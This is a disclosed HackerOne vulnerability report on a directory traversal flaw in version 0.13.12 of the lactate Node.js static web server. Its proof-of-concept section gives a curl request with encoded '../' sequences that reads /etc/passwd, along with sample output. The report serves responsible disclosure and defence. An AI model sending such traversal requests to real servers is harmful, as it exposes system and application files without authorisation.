# [lactate] Static Web Server Directory Traversal via Crafted GET Request

## Report Details
- **Report ID**: 296645
- **URL**: https://hackerone.com/reports/296645
- **State**: Closed
- **Severity**: medium
- **Submitted**: 2017-12-10T08:22:40.195Z
- **Disclosed**: 2018-01-23T09:53:02.015Z

## Reporter
- **Username**: ysx
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: nodejs-ecosystem

## Vulnerability Information
Hi @vdeturckheim,

A crafted GET request can be leveraged to traverse the directory structure of a host using the `lactate` web server package, and request arbitrary files outside of the specified web root.

## Module specification
* **Name**: [lactate](https://www.npmjs.com/package/lactate)
* **Version**: 0.13.12 (latest release build)

## Verified conditions
* **Test server:** Ubuntu 16.04 LTS
* **cURL package**: `curl 7.55.1 (2017-08-14)`

I have not presently attempted to contact the maintainer and would appreciate assistance from Node.js Security in doing so, as described in the Disclosure Guidelines. This package has a considerably larger download count than those previously reported.

## Proof of concept

Please globally install the `lactate` package and `cd` to a chosen directory (in this case, `/root`) on your test server. Next, run `lactate  -p 8081` to start serving from this location.

Substituting the `<server-IP>` value as appropriate, the following cURL request can be used to demonstrate this vulnerability by requesting the target `/etc/passwd` file:

```
curl "http://<server-IP>:8081/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd"
```

```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
[...]
```

Thanks,

Yasin

## Impact

An adversary can leverage this vulnerability to request arbitrary files from the target host, which may include application source code or system configuration data.

## Attachments
No attachments
